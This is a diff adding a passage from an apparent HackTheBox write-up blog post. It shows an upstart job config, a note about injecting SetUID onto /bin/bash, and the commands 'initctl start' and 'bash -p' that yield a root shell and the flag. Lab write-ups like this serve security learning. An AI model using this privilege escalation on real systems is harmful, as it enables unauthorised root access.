+    <span class="nx">echo</span> <span class="nx">$$</span> <span class="o">&gt;</span> <span class="sr">/var/</span><span class="nx">run</span><span class="o">/</span><span class="nx">nodetest</span><span class="p">.</span><span class="nx">pid</span>
+    <span class="nx">exec</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">nodebrew</span><span class="o">/</span><span class="nx">node</span><span class="o">/</span><span class="nx">v8</span><span class="p">.</span><span class="mf">9.4</span><span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">node</span> <span class="o">/</span><span class="nx">srv</span><span class="o">/</span><span class="nx">nodetest</span><span class="p">.</span><span class="nx">js</span>
+
+<span class="nx">end</span> <span class="nx">script</span>
+
+<span class="nx">pre</span><span class="o">-</span><span class="nx">start</span> <span class="nx">script</span>
+    <span class="nx">echo</span> <span class="dl">"</span><span class="s2">[`date`] Node Test Starting</span><span class="dl">"</span> <span class="o">&gt;&gt;</span> <span class="sr">/var/</span><span class="nx">log</span><span class="o">/</span><span class="nx">nodetest</span><span class="p">.</span><span class="nx">log</span>
+<span class="nx">end</span> <span class="nx">script</span>
+
+<span class="nx">pre</span><span class="o">-</span><span class="nx">stop</span> <span class="nx">script</span>
+    <span class="nx">rm</span> <span class="o">/</span><span class="kd">var</span><span class="sr">/run/</span><span class="nx">nodetest</span><span class="p">.</span><span class="nx">pid</span>
+    <span class="nx">echo</span> <span class="dl">"</span><span class="s2">[`date`] Node Test Stopping</span><span class="dl">"</span> <span class="o">&gt;&gt;</span> <span class="sr">/var/</span><span class="nx">log</span><span class="o">/</span><span class="nx">nodetest</span><span class="p">.</span><span class="nx">log</span>
+<span class="nx">end</span> <span class="nx">script</span>
+</code></pre></div></div>
+<p>Injecting SetUID pada konfigurasi di atas ke <strong>/bin/bash</strong> agar bisa di eskalasi ke tahap <strong>root</strong>.
+dengan perintah <strong>-p</strong> yang berfungsi mepriviledges <em>bash</em>.</p>
+
+<p>And boom.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.3<span class="nv">$ </span><span class="nb">sudo</span> /sbin/initctl start test3
+test3 start/running, process 18662
+bash-4.3<span class="nv">$ </span>/bin/bash <span class="nt">-p</span>
+bash-4.3# <span class="nb">cd</span> /root
+bash-4.3# <span class="nb">cat </span>root.txt
+d44519713b889d5e1f9e536d0c6df2fc
+bash-4.3# 
+</code></pre></div></div>
+
+<h2 id="os-mystery">OS Mystery</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-4.3# <span class="nb">cat</span> /etc/lsb-release
+<span class="nv">GOOGLE_RELEASE</span><span class="o">=</span>87.3.41
+<span class="nv">CHROMEOS_RELEASE_BRANCH_NUMBER</span><span class="o">=</span>85
+<span class="nv">CHROMEOS_RELEASE_TRACK</span><span class="o">=</span>stable-channel
+<span class="nv">CHROMEOS_RELEASE_KEYSET</span><span class="o">=</span>devkeys
+<span class="nv">CHROMEOS_RELEASE_NAME</span><span class="o">=</span>Chromium OS
+<span class="nv">CHROMEOS_AUSERVER</span><span class="o">=</span>https://cloudready-free-update-server-2.neverware.com/update
+<span class="nv">CHROMEOS_RELEASE_BOARD</span><span class="o">=</span>chromeover64
+<span class="nv">CHROMEOS_DEVSERVER</span><span class="o">=</span>https://cloudready-free-update-server-2.neverware.com/
+<span class="nv">CHROMEOS_RELEASE_BUILD_NUMBER</span><span class="o">=</span>13505
+<span class="nv">CHROMEOS_CANARY_APPID</span><span class="o">={</span>90F229CE-83E2-4FAF-8479-E368A34938B1<span class="o">}</span>
+<span class="nv">CHROMEOS_RELEASE_CHROME_MILESTONE</span><span class="o">=</span>87
+<span class="nv">CHROMEOS_RELEASE_PATCH_NUMBER</span><span class="o">=</span>2021_01_15_2352
+<span class="nv">CHROMEOS_RELEASE_APPID</span><span class="o">=</span>87efface-864d-49a5-9bb3-4b050a7c227a
+<span class="nv">CHROMEOS_BOARD_APPID</span><span class="o">=</span>87efface-864d-49a5-9bb3-4b050a7c227a
+<span class="nv">CHROMEOS_RELEASE_BUILD_TYPE</span><span class="o">=</span>Developer Build - neverware
+<span class="nv">CHROMEOS_RELEASE_VERSION</span><span class="o">=</span>87.3.41
+<span class="nv">CHROMEOS_RELEASE_DESCRIPTION</span><span class="o">=</span>87.3.41 <span class="o">(</span>Developer Build - neverware<span class="o">)</span> stable-channel chromeover64
+</code></pre></div></div>
+
+
+  </div>
+  <div class="post-info" style="padding-top: 25px">
+    <div class="post-date">
+      2021-06-16.
+    </div>
+    <div class="post-categories">
+      <span></span>
+      
+      <a href="/category/hackthebox" class="post-category">hackthebox</a>
+      
+    </div>
+    <div class="post-tags">
+      <span></span>
+      
+      <a href="/tag/mis-config" class="post-tag">mis-config</a>
+      
+      <a href="/tag/ssh" class="post-tag">ssh</a>
+      
+      <a href="/tag/wordpress" class="post-tag">wordpress</a>
+      
+      <a href="/tag/initctl" class="post-tag">initctl</a>
+      
+      <a href="/tag/setsuid" class="post-tag">setsuid</a>
+      
+    </div>
+    <div class="post-tools">
+      
+      <div>
+        <span></span><a href="/2021/08/08/htb-love">HackTheBox: Love</a>
+      </div>
+      
+      
+      <div>
+        <span></span><a href="/2021/05/13/hmv-connection">HackMyVM: Connection</a>
+      </div>
+      
+    </div>
+    
+  </div>
+</article>
+
+    </main>
+    <footer class="container-footer">
+      <div class="footer-copyright">
+  <span class="footer-copyright-text float-left">Copyright &copy; 2022.  sharpicx.</span>
+  <span class="footer-copyright-text float-right">
+    Powered by <a href="https://jekyllrb.com/">Jekyll</a>
+  </span>
+</div>
+
+    </footer>
+  </div>
+</body>
+</html>
